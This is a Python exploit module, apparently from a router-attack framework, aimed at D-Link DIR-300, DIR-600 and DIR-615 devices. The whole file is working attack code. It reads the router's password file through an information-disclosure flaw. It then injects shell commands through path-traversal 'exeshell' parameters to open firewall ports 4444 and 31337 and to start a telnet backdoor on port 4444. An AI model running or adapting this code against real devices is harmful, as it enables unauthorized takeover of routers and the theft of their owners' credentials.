# Name:D-link DIR-300 DIR-600 and DIR-615 information disclosure
# File:dir300_600_info.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 18.07.2016
# Last modified: 18.07.2016
# Shodan Dork:
# Description: Information disclosure on DIR-300, DIR-600 and DIR-615(4.0)
# Based on: http://seclists.org/bugtraq/2013/Dec/11

import core.Exploit
import core.io

import requests
import re
import urllib.parse
import urllib.request
import urllib.error
from collections import OrderedDict
from interface.messages import print_error, print_yellow, print_success, print_help, print_green


class Exploit(core.Exploit.RextExploit):
    """
Name:D-link DIR-300 DIR-600 and DIR-615 information disclosure
File:dir300_600_info.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 18.07.2016
Description: Information disclosure on DIR-300, DIR-600 and DIR-615(4.0)
Based on: http://seclists.org/bugtraq/2013/Dec/11

Options:
    Name        Description

    host        Target host address
    port        Target port
    """
    password = ""

    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        url = "http://%s:%s/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd" % (self.host, self.port)

        proxies = {
                    "http": "http://127.0.0.1:8080",
                    "https": "http://127.0.0.1:8080",
        }
        try:
            print_yellow("Sending exploit")
            response = requests.get(url, timeout=60)
            if response.status_code == 200 and "<center>" in response.text:
                print_success("credentials fetched")
                credentials = re.findall("<center>\n\t\t\t(.*)", response.text)
                print_green(credentials[0])
                print_yellow("Changing iptables")
                url = "http://%s:%s/tools_system.xgi?" % (self.host, self.port)

                data = OrderedDict([('random_num', '2011.9.22.13.59.33'),
                                    ('exeshell', '../../../../usr/sbin/iptables -t nat -A PRE_MISC -i eth0.2 -p tcp --dport 4444 -j ACCEPT'),
                                    ('set/runtime/syslog/sendmail', 1)])
                query = urllib.parse.urlencode(data)
                query = query.replace('%2F', '/')
                query = query.replace('+', ' ')
                query = query.replace('%20', ' ')
                query = query.replace('%3D', '=')
                query = query.replace('%3A', ':')
                print(query)
                full_url = url + query
                headers = {'Accept': '*/*'}
                try:
                    req = urllib.request.Request(full_url, headers=headers)
                    data = urllib.request.urlopen(req)
                except urllib.error.HTTPError as e:
                    print(e)

                data = OrderedDict([('random_num', '2011.9.22.13.59.33'),
                                    ('exeshell', '../../../../usr/sbin/iptables -t nat -A PRE_MISC -i eth0.2 -p tcp --dport 31337 -j ACCEPT'),
                                    ('set/runtime/syslog/sendmail', 1)])
                query = urllib.parse.urlencode(data)
                query = query.replace('%2F', '/')
                query = query.replace('+', ' ')
                query = query.replace('%20', ' ')
                query = query.replace('%3D', '=')
                query = query.replace('%3A', ':')
                print(query)
                full_url = url + query
                try:
                    data = urllib.request.urlopen(full_url)
                except urllib.error.HTTPError as e:
                    print(e)


                print_yellow("Starting telnetd")
                data = OrderedDict([('random_num', '2011.9.22.13.59.33'),
                                    ('exeshell', '../../../../usr/sbin/telnetd -p 4444 -l /usr/sbin/login -u hacked:me'),
                                    ('set/runtime/syslog/sendmail', 1)])
                query = urllib.parse.urlencode(data)
                query = query.replace('%2F', '/')
                query = query.replace('+', ' ')
                query = query.replace('%20', ' ')
                query = query.replace('%3D', '=')
                query = query.replace('%3A', ':')
                print(query)
                full_url = url + query
                try:
                    data = urllib.request.urlopen(full_url)
                except urllib.error.HTTPError as e:
                    print(e)
                print_green("With a little luck telnetd is running on 4444")
            else:
                print_error("exploit failed")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed")
Exploit()
